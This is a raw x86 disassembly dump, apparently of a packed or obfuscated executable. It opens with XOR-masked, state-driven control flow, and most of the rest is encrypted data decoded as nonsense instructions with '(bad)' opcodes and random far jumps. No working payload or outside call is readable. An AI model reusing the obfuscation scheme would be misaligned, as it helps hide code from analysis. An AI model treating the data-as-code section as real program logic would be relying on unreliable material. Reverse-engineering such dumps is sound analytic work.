  4124ba:	xor    DWORD PTR ds:0x426ebd,0x426e81
  4124c4:	mov    DWORD PTR [ebp-0x44],edx
  4124c7:	and    DWORD PTR ds:0x426f05,0x0
  4124d1:	mov    edx,DWORD PTR ds:0x426f05
  4124d7:	inc    edx
  4124d8:	mov    DWORD PTR ds:0x426f05,edx
  4124de:	cmp    DWORD PTR ds:0x426f05,0x28
  4124e5:	jg     0x412506
  4124eb:	jmp    0x4124f9
  4124f0:	push   DWORD PTR [ebp-0x1c]
  4124f3:	call   DWORD PTR ds:0x42fa28
  4124f9:	cmp    DWORD PTR ds:0x426f05,0x1d
  412500:	jb     0x4124d1
  412506:	mov    edx,DWORD PTR [ebp+0x8]
  412509:	xor    edx,eax
  41250b:	add    edx,esi
  41250d:	jne    0x41220b
  412513:	jmp    0x416e72
  412518:	mov    edx,DWORD PTR [ebp-0xc]
  41251b:	sub    edx,esi
  41251d:	xor    edx,eax
  41251f:	mov    DWORD PTR [ebp-0x5c],edx
  412522:	mov    edx,DWORD PTR [ebp-0x10]
  412525:	mov    ebx,DWORD PTR [ebp-0x8]
  412528:	xor    edx,eax
  41252a:	xor    ebx,eax
  41252c:	sub    edx,ebx
  41252e:	sub    edx,esi
  412530:	xor    edx,eax
  412532:	mov    DWORD PTR [ebp-0x10],edx
  412535:	mov    edx,DWORD PTR [ebp-0x14]
  412538:	mov    DWORD PTR [ebp+0x8],edx
  41253b:	jmp    0x4125b0
  412540:	mov    edx,DWORD PTR [ebp+0x8]
  412543:	mov    ebx,DWORD PTR [ebp-0x8]
  412546:	xor    edx,eax
  412548:	xor    ebx,eax
  41254a:	sub    edx,ebx
  41254c:	sub    edx,esi
  41254e:	xor    edx,eax
  412550:	mov    DWORD PTR [ebp+0x8],edx
  412553:	mov    edx,DWORD PTR [ebp+0x8]
  412556:	mov    ebx,DWORD PTR [ebp-0x58]
  412559:	lea    edx,[ebx+edx*1+0x5708f4]
  412560:	mov    DWORD PTR [ebp-0x58],edx
  412563:	mov    edx,DWORD PTR [ebp+0x8]
  412566:	mov    ebx,DWORD PTR [ebp-0x54]
  412569:	add    edx,0x64f89a
  41256f:	imul   edx,ebx
  412572:	mov    DWORD PTR [ebp-0x54],edx
  412575:	mov    edx,DWORD PTR [ebp+0x8]
  412578:	mov    ebx,DWORD PTR [ebp-0x50]
  41257b:	add    edx,0x242ebe9
  412581:	and    edx,ebx
  412583:	mov    DWORD PTR [ebp-0x50],edx
  412586:	mov    edx,DWORD PTR [ebp+0x8]
  412589:	mov    ebx,DWORD PTR [ebp-0x4c]
  41258c:	add    edx,ecx
  41258e:	or     edx,ebx
  412590:	mov    DWORD PTR [ebp-0x4c],edx
  412593:	mov    edx,DWORD PTR [ebp+0x8]
  412596:	mov    ebx,0xfdbe0321
  41259b:	sub    ebx,edx
  41259d:	add    ebx,DWORD PTR [ebp-0x48]
  4125a0:	mov    DWORD PTR [ebp-0x48],ebx
  4125a3:	mov    edx,DWORD PTR [ebp+0x8]
  4125a6:	mov    ebx,DWORD PTR [ebp-0x44]
  4125a9:	add    edx,edi
  4125ab:	xor    edx,ebx
  4125ad:	mov    DWORD PTR [ebp-0x44],edx
  4125b0:	mov    edx,DWORD PTR [ebp+0x8]
  4125b3:	xor    edx,eax
  4125b5:	add    edx,esi
  4125b7:	jne    0x412540
  4125bd:	jmp    0x414910
  4125c2:	push   esp
  4125c3:	pop    edi
  4125c4:	push   0x2e
  4125c6:	js     0x4125f6
  4125c8:	pop    eax
  4125c9:	imul   ebx,DWORD PTR [edx+0x12],0xdd287a6a
  4125d0:	xchg   esp,eax
  4125d1:	inc    ecx
  4125d2:	sbb    BYTE PTR [ebx+0x7b],dh
  4125d5:	jnp    0x412588
  4125d7:	pushf  
  4125d8:	jnp    0x412655
  4125da:	shr    al,0x4c
  4125dd:	and    dl,BYTE PTR [edx-0x45d37b52]
  4125e3:	jo     0x41264e
  4125e5:	dec    ecx
  4125e6:	fbld   TBYTE PTR [edi+0x1f]
  4125e9:	test   DWORD PTR [eax+eax*8-0x7d],ecx
  4125ed:	pusha  
  4125ee:	push   edi
  4125ef:	push   ebx
  4125f0:	rcr    DWORD PTR [eax],0x88
  4125f3:	mov    esp,0x3033fd3d
  4125f8:	icebp  
  4125f9:	les    edx,FWORD PTR ds:0x85a0fe63
  4125ff:	pop    esp
  412600:	stos   BYTE PTR es:[edi],al
  412601:	xchg   ebp,eax
  412602:	je     0x412666
  412604:	jmp    0xe5463292
  412609:	cmp    dh,cl
  41260b:	xor    DWORD PTR [ebp+0x4f183230],eax
  412611:	(bad)  
  412612:	loopne 0x412594
  412614:	pop    ecx
  412615:	clc    
  412616:	cmp    cl,al
  412618:	stos   BYTE PTR es:[edi],al
  412619:	ins    BYTE PTR es:[edi],dx
  41261a:	or     ecx,ebx
  41261c:	jns    0x4125d2
  41261e:	and    BYTE PTR ds:0x52270810,al
  412624:	pop    DWORD PTR [edx-0x23aead07]
  41262a:	mul    DWORD PTR [eax+0x70]
  41262d:	int    0x5f
  41262f:	mov    edx,0xc4bbbcf1
  412634:	push   ecx
  412635:	(bad)  
  412636:	lods   eax,DWORD PTR ds:[esi]
  412637:	sub    DWORD PTR [esi],esi
  412639:	lahf   
  41263a:	mov    BYTE PTR ds:0x754c0af0,dl
  412640:	enter  0x405c,0xf2
  412644:	mov    ebx,0x96535cad
  412649:	ud1    ebx,DWORD PTR ds:0xa8d2a333
  412650:	dec    ebp
  412651:	sbb    ebx,DWORD PTR [ebx-0x71b503e0]
  412657:	loop   0x4125f0
  412659:	fdivrp st(0),st
  41265b:	aam    0x51
  41265d:	cmp    dl,BYTE PTR [eax]
  41265f:	push   esp
  412660:	lahf   
  412661:	aas    
  412662:	(bad)  
  412664:	xchg   edi,eax
  412665:	or     eax,DWORD PTR [ebx-0x3b]
  412668:	dec    edx
  412669:	inc    ebx
  41266a:	and    al,0xab
  41266c:	rol    BYTE PTR [esi+0x6109fde1],0x9c
  412673:	ins    DWORD PTR es:[edi],dx
  412674:	hlt    
  412675:	add    dl,dh
  412677:	inc    esi
  412678:	sbb    BYTE PTR [edi-0x1f],ch
  41267b:	mov    ds:0x8431f882,al
  412680:	mov    ebx,0xe11b14b9
  412685:	and    dh,BYTE PTR [ecx-0xf5101e5]
  41268b:	jae    0x41264e
  41268d:	mov    eax,ds:0x6fb8b32f
  412692:	push   esi
  412693:	pop    ss
  412694:	xchg   ebp,eax
  412695:	jge    0x4126bb
  412697:	inc    ecx
  412698:	add    ecx,eax
  41269a:	inc    esi
  41269b:	pop    eax
  41269c:	fld    QWORD PTR [edi]
  41269e:	sub    bh,al
  4126a0:	test   ebx,ecx
  4126a2:	scas   eax,DWORD PTR es:[edi]
  4126a3:	retf   
  4126a4:	(bad)  
  4126a5:	and    eax,0xec1759cb
  4126aa:	xchg   edi,eax
  4126ab:	mov    edi,0xeb5232db
  4126b0:	bound  ebp,QWORD PTR [ecx]
  4126b2:	leave  
  4126b3:	scas   eax,DWORD PTR es:[edi]
  4126b4:	inc    edx
  4126b5:	popa   
  4126b6:	and    BYTE PTR [ecx],bh
  4126b8:	push   eax
  4126b9:	xor    edi,DWORD PTR [esi]
  4126bb:	scas   al,BYTE PTR es:[edi]
  4126bc:	outs   dx,BYTE PTR ds:[esi]
  4126bd:	jb     0x41266b
  4126bf:	add    BYTE PTR [ebx+ecx*4+0x7ffa3cc7],cl
  4126c6:	xor    BYTE PTR [ebx-0xa],dh
  4126c9:	(bad)  
  4126ca:	or     bl,dh
  4126cc:	jo     0x41273c
  4126ce:	add    BYTE PTR [edi-0x49],bl
  4126d1:	enter  0xe443,0x37
  4126d5:	add    al,0xde
  4126d7:	jp     0x4126dc
  4126d9:	pushf  
  4126da:	stc    
  4126db:	loope  0x412673
  4126dd:	jne    0x4126de
  4126df:	mov    cl,0x87
  4126e1:	add    esi,DWORD PTR [ecx*8-0x2af27d1d]
  4126e8:	or     BYTE PTR [eax],ah
  4126ea:	lea    esp,[esp+edi*8-0x46]
  4126ee:	inc    esi
  4126ef:	pusha  
  4126f0:	ds push ebx
  4126f2:	dec    eax
  4126f3:	or     eax,0xd3788683
  4126f8:	inc    eax
  4126f9:	(bad)  
  4126fa:	adc    al,0x2e
  4126fc:	sub    DWORD PTR [edx],0x30
  4126ff:	loope  0x412769
  412701:	push   ebx
  412702:	lods   al,BYTE PTR ds:[esi]
  412703:	ficom  DWORD PTR gs:[ebx+eiz*1-0x3d]
  412708:	jns    0x41269c
  41270a:	cmc    
  41270b:	in     eax,dx
  41270c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41270d:	and    al,0x67
  41270f:	sub    al,0xfb
  412711:	inc    ebp
  412712:	or     edi,DWORD PTR [eax-0x5f]
  412715:	mov    ebx,0x16ade449
  41271a:	mov    ebx,0x25fd441e
  41271f:	dec    eax
  412720:	jne    0x4126b7
  412722:	hlt    
  412723:	sbb    BYTE PTR [ecx+0x5f],bl
  412726:	pop    ss
  412727:	ds cld 
  412729:	retf   0x549b
  41272c:	mov    bh,0x7
  41272e:	push   ss
  41272f:	mov    cl,0xf4
  412731:	(bad)  
  412732:	fwait
  412733:	cld    
  412734:	cmc    
  412735:	rcr    bl,1
  412737:	fst    QWORD PTR [eax]
  412739:	lds    esp,FWORD PTR [eax+0x23]
  41273c:	retf   0x4b99
  41273f:	out    0x4,eax
  412741:	imul   esp,edi,0x3f6af529
  412747:	jo     0x4127a4
  412749:	lock ret 0x60e6
  41274d:	fnstenv [eax+0x6bafe89]
  412753:	sbb    eax,0xf5a497af
  412758:	xlat   BYTE PTR ds:[ebx]
  412759:	adc    al,0x48
  41275b:	daa    
  41275c:	rcr    al,cl
  41275e:	popf   
  41275f:	jb     0x4126ef
  412761:	pop    ebx
  412762:	clc    
  412763:	jl     0x4127dd
  412765:	adc    eax,0x69b70542
  41276a:	repz adc DWORD PTR [ebx-0x23],edx
  41276e:	lahf   
  41276f:	xchg   BYTE PTR [ebx+0x14],dl
  412772:	xor    eax,0xd8b5ccd7
  412777:	in     eax,0x9d
  412779:	dec    ecx
  41277a:	int    0xc8
  41277c:	xchg   ecx,eax
  41277d:	jno    0x412790
  41277f:	fidivr DWORD PTR [edi]
  412781:	into   
  412782:	cmp    eax,0x3833e1
  412787:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412788:	mov    BYTE PTR [ebx+0x6077843c],cl
  41278e:	call   0x201f:0x592dc2fd
  412795:	loopne 0x412730
  412797:	add    eax,0x588da7a5
  41279c:	cmp    al,0xb2
  41279e:	xchg   ebx,eax
  41279f:	pop    edi
  4127a0:	dec    edi
  4127a1:	sbb    eax,0x26ee7424
  4127a6:	repnz in eax,dx
  4127a8:	das    
  4127a9:	sub    eax,0xe55c533c
  4127ae:	jmp    0xad08:0x90941362
  4127b5:	mov    eax,0x48574c60
  4127ba:	in     al,dx
  4127bb:	jle    0x412741
  4127bd:	popf   
  4127be:	fdivr  QWORD PTR [ebx+0x2c24cd2c]
  4127c4:	mov    eax,0xfc407b15
  4127c9:	(bad)  
  4127ca:	jle    0x41279a
  4127cc:	cmp    eax,0x32ee057d
  4127d1:	sti    
  4127d2:	mov    al,0xb4
  4127d4:	imul   BYTE PTR [eax]
  4127d6:	cmc    
  4127d7:	sbb    eax,edx
  4127d9:	add    BYTE PTR [ebx+0x31c069ca],ch
  4127df:	sbb    bl,BYTE PTR cs:[edi-0x1fe28951]
  4127e6:	and    BYTE PTR [edi],0x26
  4127e9:	add    dh,BYTE PTR [ebx-0xba99559]
  4127ef:	clc    
  4127f0:	dec    ebp
  4127f1:	cmp    al,0x96
  4127f3:	jnp    0x41279d
  4127f5:	es lock addr16 out dx,al
  4127f9:	pop    ebp
  4127fa:	inc    ebp
  4127fb:	jns    0x41279d
  4127fd:	dec    eax
  4127fe:	xor    ecx,DWORD PTR [eax]
  412800:	shl    ch,0xd8
  412803:	push   ds
  412804:	xchg   ecx,eax
  412805:	sub    BYTE PTR [eax+0x628bb288],ch
  41280b:	xchg   esp,eax
  41280c:	sub    BYTE PTR [esi-0x6b7eedd4],cl
  412812:	xor    eax,0x1af4901c
  412817:	out    0x1f,eax
  412819:	fsub   DWORD PTR [eax-0x5c0b8afe]
  41281f:	and    BYTE PTR [ecx],ch
  412821:	xor    DWORD PTR [esi+0x5d833909],esi
  412827:	ficomp DWORD PTR [ecx]
  412829:	sbb    BYTE PTR [edx-0x66f71cd5],bh
  41282f:	cwde   
  412830:	lock mov cl,0xab
  412833:	mov    ch,0x74
  412835:	inc    esp
  412836:	ror    BYTE PTR [ecx+edx*2],0xdb
  41283a:	adc    DWORD PTR [ebp+0x1b],eax
  41283d:	int    0x36
  41283f:	xchg   esp,eax
  412840:	aad    0x15
  412842:	(bad)  
  412843:	(bad)  
  412844:	out    dx,eax
  412845:	int3   
  412846:	das    
  412847:	(bad)  
  412848:	sub    DWORD PTR [ebp+0x4f28de1a],eax
  41284e:	call   0x9f85:0x4c0df1b7
  412855:	sbb    esi,DWORD PTR [ecx+0x71]
  412858:	adc    al,0x3c
  41285a:	cs (bad) 
  41285c:	push   edx
  41285d:	fmul   st(1),st
  41285f:	sbb    dl,bl
  412861:	mov    dl,0xc
  412863:	jmp    0xc22c:0x59c15508
  41286a:	adc    edx,DWORD PTR ds:0x11721501
  412870:	test   ch,ah
  412872:	pop    edi
  412873:	mov    al,ds:0x26a1e119
  412878:	lods   al,BYTE PTR ds:[esi]
  412879:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41287a:	(bad)  
  41287b:	std    
  41287c:	xchg   esi,eax
  41287d:	add    ecx,DWORD PTR [eax+0x26]
  412880:	call   0x3ab4:0x1e6e064c
  412887:	cmp    DWORD PTR [esi],ebx
  412889:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41288a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41288b:	inc    ecx
  41288c:	cmc    
  41288d:	mov    ebx,0xd0e60c1
  412892:	lea    ecx,[ecx+0x2b87d8b9]
  412898:	push   esi
  412899:	xchg   ecx,eax
  41289a:	daa    
  41289b:	fcom   QWORD PTR [edx]
  41289d:	cs mov cl,0x89
  4128a0:	inc    ebp
  4128a1:	cli    
  4128a2:	rcr    BYTE PTR [edx+eiz*2],cl
  4128a5:	xchg   edi,eax
  4128a6:	retf   0x2619
  4128a9:	lods   eax,DWORD PTR ds:[esi]
  4128aa:	push   cs
  4128ab:	aas    
  4128ac:	push   esi
  4128ad:	fnstsw WORD PTR [edi-0x29]
  4128b0:	data16 jae 0x41288e
  4128b3:	aaa    
  4128b4:	jb     0x412898
  4128b6:	adc    BYTE PTR [eax-0x11],cl
  4128b9:	popa   
  4128ba:	clc    
  4128bb:	mov    edx,0xbdde1a3c
  4128c0:	cmp    al,0xae
  4128c2:	adc    ah,BYTE PTR [ebp+0x52f4224a]
  4128c8:	sbb    eax,0x3114a1d7
  4128cd:	popf   
  4128ce:	xor    edx,esp
  4128d0:	leave  
  4128d1:	ins    BYTE PTR es:[edi],dx
  4128d2:	jecxz  0x412899
  4128d4:	mov    cl,0x7a
  4128d6:	fild   QWORD PTR [edi]
  4128d8:	int    0x43
  4128da:	std    
  4128db:	ficom  DWORD PTR [esi+0x73]
  4128de:	vpslld xmm2,xmm0,XMMWORD PTR [esi]
  4128e2:	sbb    al,0x1e
  4128e4:	jne    0x41292a
  4128e6:	ins    DWORD PTR es:[edi],dx
  4128e7:	rol    BYTE PTR [edi-0xe22f8ac],0x4e
  4128ee:	jnp    0x4128fe
  4128f0:	jb     0x412970
  4128f2:	mov    ebp,DWORD PTR [ecx-0x52a232fd]
  4128f8:	lods   eax,DWORD PTR ds:[esi]
  4128f9:	or     DWORD PTR [ebp*2+0x40430ca1],esi
  412900:	sub    DWORD PTR [edx],esp
  412902:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412903:	xor    DWORD PTR [esi],ecx
  412905:	jl     0x4128c8
  412907:	mov    edx,0xb7416ea0
  41290c:	jb     0x41296e
  41290e:	xchg   edi,eax
  41290f:	sub    eax,0xa171c08d
  412914:	xor    DWORD PTR [edx-0x4b1eaeb5],0xffffffea
  41291b:	fcmovu st,st(4)
  41291d:	lock adc eax,0x38014502
  412923:	jns    0x4128e6
  412925:	push   esi
  412926:	xchg   esp,eax
  412927:	add    al,0x5a
  412929:	push   eax
  41292a:	xchg   esi,eax
  41292b:	mov    ah,0x42
  41292d:	cmp    edx,DWORD PTR [edx+0x39]
  412930:	adc    dh,BYTE PTR [ecx]
  412932:	lock push eax
  412934:	xchg   esp,eax
  412935:	sbb    BYTE PTR [ecx+ecx*1-0x4c4d3524],ch
  41293c:	stc    
  41293d:	xchg   ebp,eax
  41293e:	div    ch
  412940:	adc    BYTE PTR [ebx+edx*8+0x26],dh
  412944:	pop    ebx
  412945:	icebp  
  412946:	push   edi
  412947:	sbb    ecx,DWORD PTR ds:0xb12f15dd
  41294d:	ss lock pop ds
  412950:	or     BYTE PTR [ecx-0x65b1e425],bh
  412956:	or     BYTE PTR [edx],0x3
  412959:	arpl   WORD PTR [ebp-0x69],di
  41295c:	leave  
  41295d:	lock in al,0xf0
  412960:	mov    al,0xd2
  412962:	push   ebx
  412963:	lahf   
  412964:	adc    al,0x14
  412966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412967:	jo     0x412909
  412969:	mov    ebx,0x7bb68fff
  41296e:	jmp    0xc2e7:0x930f53f6
  412975:	sbb    dh,cl
  412977:	adc    esi,DWORD PTR [esi]
  412979:	pop    edi
  41297a:	sub    al,0xbb
  41297c:	inc    edi
  41297d:	bound  ebp,QWORD PTR [esi+0x60]
  412980:	aam    0x93
  412982:	mov    ds,WORD PTR [ebp+0x15694bd0]
  412988:	inc    eax
  412989:	fist   DWORD PTR [esi+ecx*4]
  41298c:	lods   eax,DWORD PTR ds:[esi]
  41298d:	loope  0x412948
  41298f:	xor    DWORD PTR [ebx],ebp
  412991:	mov    bh,0xd7
  412993:	jns    0x412996
  412995:	pop    esi
  412996:	pop    ebx
  412997:	int3   
  412998:	out    dx,al
  412999:	sbb    eax,0x19e55919
  41299e:	adc    esi,eax
  4129a0:	bound  eax,QWORD PTR [ebx-0xf]
  4129a3:	hlt    
  4129a4:	sub    ecx,edx
  4129a6:	jl     0x4129a1
  4129a8:	cmp    eax,0x56aceacf
  4129ad:	in     eax,dx
  4129ae:	mov    dl,0x52
  4129b0:	cdq    
  4129b1:	ds mov al,ch
  4129b4:	test   ebp,eax
  4129b6:	(bad)  
  4129b8:	xchg   BYTE PTR ds:0x7ad6b68a,ah
  4129be:	fstp   st(6)
  4129c0:	cs fwait
  4129c2:	sti    
  4129c3:	and    eax,0xb22cea22
  4129c8:	xchg   esi,eax
  4129c9:	int    0xc
  4129cb:	stc    
  4129cc:	mov    BYTE PTR [eax-0x3c],bl
  4129cf:	jmp    0x412969
  4129d1:	enter  0x3793,0x45
  4129d5:	adc    edi,edx
  4129d7:	dec    ecx
  4129d8:	mov    dl,0xcb
  4129da:	or     al,0x52
  4129dc:	aam    0x47
  4129de:	test   eax,ecx
  4129e0:	fmul   st,st(4)
  4129e2:	es jno 0x41297f
  4129e5:	adc    BYTE PTR [eax+0x638aa249],bl
  4129eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129ec:	js     0x4129f8
  4129ee:	ins    BYTE PTR es:[edi],dx
  4129ef:	inc    eax
  4129f0:	pushf  
  4129f1:	mov    eax,ds:0x3ae28a96
  4129f6:	fs push ebp
  4129f8:	ds dec esi
  4129fa:	pop    ss
  4129fb:	mov    edi,0x16a291bf
  412a00:	sub    dh,bh
  412a02:	popa   
  412a03:	xor    al,0xe3
  412a05:	sub    DWORD PTR ds:0x7a679787,ebp
  412a0b:	(bad)  
  412a0c:	mov    esp,DWORD PTR [eax+0x4f4ffb09]
  412a12:	push   esi
  412a13:	popf   
  412a14:	mov    ah,0x24
  412a16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a17:	aaa    
  412a18:	sub    BYTE PTR [ecx-0x6a],0x5c
  412a1c:	pop    ecx
  412a1d:	mov    ds:0x2d31dff1,al
  412a22:	and    al,0x31
  412a24:	mov    al,0xcc
  412a26:	push   edx
  412a27:	inc    edi
  412a28:	out    dx,eax
  412a29:	lods   eax,DWORD PTR ds:[esi]
  412a2a:	js     0x412a88
  412a2c:	out    0x3,al
  412a2e:	dec    eax
  412a2f:	(bad)  
  412a30:	out    0x9a,eax
  412a32:	pop    ebx
  412a33:	dec    edx
  412a34:	nop
  412a35:	jbe    0x412a7b
  412a37:	cwde   
  412a38:	lock call 0xf986:0x968c0dc7
  412a40:	mov    bl,0xab
  412a42:	dec    edx
  412a43:	jg     0x412a1f
  412a45:	call   0xe9728f73
  412a4a:	cmp    eax,0x3f120593
  412a4f:	(bad)  
  412a50:	ffree  st(6)
  412a52:	inc    edi
  412a53:	jl     0x412a8f
  412a55:	jmp    0x412a78
  412a57:	jns    0x412ad1
  412a59:	sbb    dh,BYTE PTR [ecx]
  412a5b:	jl     0x412a9f
  412a5d:	stc    
  412a5e:	xchg   edx,eax
  412a5f:	dec    edx
  412a60:	mov    ebp,0x18410328
  412a65:	fisttp DWORD PTR [edi+0x20ef0e22]
  412a6b:	scas   al,BYTE PTR es:[edi]
  412a6c:	fidivr DWORD PTR [edi]
  412a6e:	push   esi
  412a6f:	mov    ds:0x208af1e6,al
  412a74:	sbb    esi,esi
  412a76:	aad    0xd2
  412a78:	retf   0xa059
  412a7b:	pop    esp
  412a7c:	xchg   ebp,eax
  412a7d:	sbb    BYTE PTR [ecx+0x2d7137ae],ch
  412a83:	in     eax,dx
  412a84:	(bad)  
  412a86:	dec    esi
  412a87:	or     al,0xd9
  412a89:	jle    0x412a9a
  412a8b:	test   ebp,edi
  412a8d:	sub    BYTE PTR [eax],ch
  412a8f:	adc    BYTE PTR [esi],ah
  412a91:	daa    
  412a92:	shl    BYTE PTR [edx+0x63],0x4e
  412a96:	mov    BYTE PTR ds:0x93847173,ch
  412a9c:	ds push esp
  412a9e:	ret    
  412a9f:	fdivr  DWORD PTR [edx-0x12842700]
  412aa5:	dec    edi
  412aa6:	and    dl,dh
  412aa8:	xchg   esp,eax
  412aa9:	push   edx
  412aaa:	pop    ss
  412aab:	pop    ds
  412aac:	adc    DWORD PTR [esi+0x3],0x1
  412ab0:	push   ecx
  412ab1:	nop
  412ab2:	push   ss
  412ab3:	pusha  
  412ab4:	hlt    
  412ab5:	mov    ds:0xffa4d01c,al
  412aba:	adc    BYTE PTR [esi],dh
  412abc:	xor    al,0x11
  412abe:	test   al,0x61
  412ac0:	mov    al,0xa4
  412ac2:	icebp  
  412ac3:	rcl    ebp,cl
  412ac5:	push   ss
  412ac6:	sbb    eax,0x16f39a38
  412acb:	daa    
  412acc:	pop    edi
  412acd:	shl    DWORD PTR [esi-0x2944a573],0x21
  412ad4:	mov    WORD PTR [ebx-0x2c],es
  412ad7:	jge    0x412ac1
  412ad9:	lods   al,BYTE PTR ds:[esi]
  412ada:	sbb    DWORD PTR [ecx+0x47eb3a40],ebp
  412ae0:	hlt    
  412ae1:	pushaw 
  412ae3:	pushf  
  412ae4:	pop    ecx
  412ae5:	or     eax,DWORD PTR [ebp+0x71ad9181]
  412aeb:	fbld   TBYTE PTR [ebx]
  412aed:	add    BYTE PTR [ecx+0x14a05fe1],dh
  412af3:	aaa    
  412af4:	inc    ecx
  412af5:	mov    ds:0x35cb7da3,al
  412afa:	leave  
  412afb:	loopne 0x412b76
  412afd:	call   edi
  412aff:	sbb    al,0xd4
  412b01:	add    BYTE PTR [esi+0x47],0xf1
  412b05:	test   eax,0x52d48f66
  412b0a:	mov    esp,0xd4dc644
  412b0f:	mov    al,0x10
  412b11:	sahf   
  412b12:	call   0x12aa:0x4dfa8576
  412b19:	mov    bl,BYTE PTR [edi]
  412b1b:	(bad)  
  412b1c:	enter  0x8d7e,0x44
  412b20:	jecxz  0x412aee
  412b22:	sar    DWORD PTR ds:0x8c0bfdfc,0xc5
  412b29:	jl     0x412b3b
  412b2b:	jmp    0xfdaf1f3c
  412b30:	mov    esi,ebx
  412b32:	in     eax,0x97
  412b34:	aaa    
  412b35:	dec    eax
  412b36:	lahf   
  412b37:	enter  0x54bd,0x2f
  412b3b:	inc    edx
  412b3c:	ret    0x5a3b
  412b3f:	xchg   edx,eax
  412b40:	in     eax,dx
  412b41:	push   ds
  412b42:	punpcklbw mm0,mm5
  412b45:	fwait
  412b46:	cmp    eax,0x674b0a98
  412b4b:	push   eax
  412b4c:	sti    
  412b4d:	mov    eax,0x32196e37
  412b52:	mov    ebx,0x8e0099fd
  412b57:	and    eax,0x92f71f9d
  412b5c:	xor    BYTE PTR [edi],dl
  412b5e:	and    bl,cl
  412b60:	adc    bh,BYTE PTR [ecx-0x25c7f8da]
  412b66:	sti    
  412b67:	and    ah,al
  412b69:	fwait
  412b6a:	call   0x319842e
  412b6f:	push   ebp
  412b70:	jb     0x412bad
  412b72:	push   esi
  412b73:	and    BYTE PTR [edx],bl
  412b75:	jb     0x412b30
  412b77:	xchg   ebx,eax
  412b78:	sbb    eax,0x4ad8c209
  412b7d:	mov    ?,WORD PTR [eax-0x411f73e4]
  412b83:	pop    eax
  412b84:	lahf   
  412b85:	mov    bh,0x82
  412b87:	add    eax,0xa9ba03d
  412b8c:	mov    edx,0x202c5b1f
  412b91:	push   0x34
  412b93:	jmp    0x412b7d
  412b95:	add    BYTE PTR [ebp+0x34],0xee
  412b99:	or     al,0x7a
  412b9b:	mov    edi,0x76787b5
  412ba0:	call   0x146e:0x8afac8a0
  412ba7:	aas    
  412ba8:	cmp    edx,DWORD PTR [edi]
  412baa:	push   ecx
  412bab:	mov    dh,0xb9
  412bad:	(bad)  [edi-0x63a0265]
  412bb3:	ror    DWORD PTR [ecx-0x7e],0x58
  412bb7:	mov    bh,0x88
  412bb9:	es inc edx
  412bbb:	pop    esp
  412bbc:	aad    0xdd
  412bbe:	js     0x412b57
  412bc0:	stos   DWORD PTR es:[edi],eax
  412bc1:	cmp    al,0x8b
  412bc3:	or     DWORD PTR [ecx-0x53],eax
  412bc6:	(bad)  
  412bc7:	and    al,0x46
  412bc9:	pop    edi
  412bca:	xor    ecx,DWORD PTR [edx+0x537daa17]
  412bd0:	add    dl,BYTE PTR [bx-0x25]
  412bd4:	and    eax,0xbc85e4bc
  412bd9:	xchg   esi,eax
  412bda:	sub    ch,BYTE PTR [esi+0x4aaab7f0]
  412be0:	fld    DWORD PTR [esi-0x5f]
  412be3:	add    BYTE PTR [esi-0xf],dh
  412be6:	sub    eax,0x41b6f59c
  412beb:	jle    0x412ba8
  412bed:	jno    0x412bde
  412bef:	in     al,dx
  412bf0:	daa    
  412bf1:	ret    
  412bf2:	sar    BYTE PTR [edx-0x66d6bf79],1
  412bf8:	mov    ch,ah
  412bfa:	push   eax
  412bfb:	inc    ecx
  412bfc:	mov    dl,0x3f
  412bfe:	lods   al,BYTE PTR ds:[esi]
  412bff:	xlat   BYTE PTR ds:[ebx]
  412c00:	out    0x42,al
  412c02:	sar    DWORD PTR [edx+0x19],cl
  412c05:	and    al,BYTE PTR [ebx+0x19]
  412c08:	dec    ebx
  412c09:	cmp    al,BYTE PTR [ebx]
  412c0b:	mov    edx,0xfceb4739
  412c10:	shl    DWORD PTR [edi+0x44],1
  412c13:	mov    WORD PTR gs:[esi+0x28],cs
  412c17:	mov    bl,0x95
  412c19:	imul   ebp,DWORD PTR [ebp-0x5d],0x5ead89d3
  412c20:	add    ah,BYTE PTR [ebx]
  412c22:	ins    DWORD PTR es:[edi],dx
  412c23:	out    0xb4,eax
  412c25:	mov    ebx,0x719cae4a
  412c2a:	inc    edi
  412c2b:	fidivr DWORD PTR [ebp+0x4f]
  412c2e:	icebp  
  412c2f:	out    0x91,eax
  412c31:	inc    ebx
  412c32:	aam    0x5
  412c34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c35:	rcr    eax,1
  412c37:	std    
  412c38:	and    DWORD PTR [ebx+0x40c86b49],ecx
  412c3e:	and    BYTE PTR [ecx+0x1543de96],0x3f
  412c45:	mov    bh,0x44
  412c47:	xor    al,0x6c
  412c49:	mov    al,ds:0x46b8e549
  412c4e:	adc    eax,0xfa3525c4
  412c53:	int3   
  412c54:	pop    ecx
  412c55:	lods   eax,DWORD PTR ds:[esi]
  412c56:	inc    ecx
  412c57:	pushf  
  412c58:	daa    
  412c59:	fstp   DWORD PTR [ecx+0x5f]
  412c5c:	push   0x67
  412c5e:	pop    ebx
  412c5f:	cmp    bh,BYTE PTR [ecx-0x2e]
  412c62:	or     bh,BYTE PTR [ecx-0x64]
  412c65:	(bad)  
  412c66:	aas    
  412c67:	push   es
  412c68:	fdivp  st(5),st
  412c6a:	xchg   esp,eax
  412c6b:	dec    esi
  412c6c:	sub    DWORD PTR [ebp+0x1ff47abc],esp
  412c72:	cmp    al,BYTE PTR [ebp-0x15cdff35]
  412c78:	fst    QWORD PTR [ebp+0x6b652e6e]
  412c7e:	inc    edx
  412c7f:	cs es ret 
  412c82:	mov    ds,WORD PTR [ebp+eax*8+0xf72e8c]
  412c89:	cmp    BYTE PTR [ebp+0x5d3308ca],0xfb
  412c90:	fbstp  TBYTE PTR [ecx-0x79]
  412c93:	inc    edi
  412c94:	outs   dx,DWORD PTR ds:[esi]
  412c95:	daa    
  412c96:	leave  
  412c97:	push   edi
  412c98:	cmp    al,0x67
  412c9a:	loopne 0x412c69
  412c9c:	(bad)  
  412c9d:	mov    ebp,0xcd5161c0
  412ca2:	mov    esp,0x3a1acf97
  412ca7:	sbb    al,0xe3
  412ca9:	sub    edx,0x3e
  412cac:	pop    edx
  412cad:	(bad)  
